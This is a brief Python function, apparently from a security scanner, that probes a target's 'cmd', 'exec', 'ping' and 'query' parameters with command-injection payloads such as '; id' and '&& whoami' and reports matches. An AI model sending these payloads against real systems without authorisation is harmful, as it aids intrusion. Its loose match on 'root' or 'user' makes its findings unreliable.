import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

def scan_command_injection(target):
    results = []
    payloads = ['; id', '&& whoami', '| whoami', '`whoami`']
    for scheme in ["http", "https"]:
        for param in ["cmd", "exec", "ping", "query"]:
            for payload in payloads:
                url = f"{scheme}://{target}?{param}={payload}"
                try:
                    res = requests.get(url, timeout=3, verify=False)
                    # Look for common command injection output
                    if "uid=" in res.text or "root" in res.text or "user" in res.text:
                        results.append({
                            "url": url,
                            "param": param,
                            "payload": payload,
                            "evidence": res.text[:200]
                        })
                except Exception:
                    continue
    return {
        "vulnerable": bool(results),
        "details": results
    }